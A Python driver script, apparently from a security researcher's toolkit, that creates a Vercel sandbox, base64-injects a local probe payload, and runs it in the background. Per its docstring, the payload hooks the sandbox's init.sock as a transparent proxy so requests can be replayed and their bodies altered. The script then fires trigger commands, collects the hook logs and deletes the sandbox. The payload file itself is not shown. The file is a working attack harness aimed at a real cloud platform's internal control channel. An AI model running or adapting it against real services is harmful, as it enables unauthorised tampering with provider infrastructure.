# -*- coding: utf-8 -*-
"""v206 驱动: init.sock 透明代理 + 重放测试 (原样 + 改 body)"""
import sys, os, time, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v206'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda206_probe_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs' % (time.time() - t0))

    inject(sid, '/vercel/sandbox/vda206_probe_user.py', open(PAY, 'rb').read())

    c, r = cmd(sid, 'bash', ['-c', 'nohup python3 /vercel/sandbox/vda206_probe_user.py > /vercel/sandbox/v206out.log 2>&1 &'], 20000)
    print('[bg payload]', c, (r or '')[:300])
    time.sleep(5)

    # 3 次触发 (经 hook proxy 应正常返回)
    c, r = cmd(sid, 'echo', ['hello-v206'], 30000)
    print('[trigger1 echo]', c, (r or '')[:500])
    time.sleep(3)
    c, r = cmd(sid, 'ls', ['/tmp'], 30000)
    print('[trigger2 ls]', c, (r or '')[:500])
    time.sleep(3)
    c, r = cmd(sid, 'pwd', [], 30000)
    print('[trigger3 pwd]', c, (r or '')[:500])

    time.sleep(50)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v206hook.log'], 30000)
    print('[hook log]', c)
    print((r or '')[:15000])
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v206out.log'], 20000)
    print('[out log]', c)
    print((r or '')[:4000])

    c, r = cmd(sid, 'echo', ['post-restore-ok'], 30000)
    print('[post-restore]', c, (r or '')[:300])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
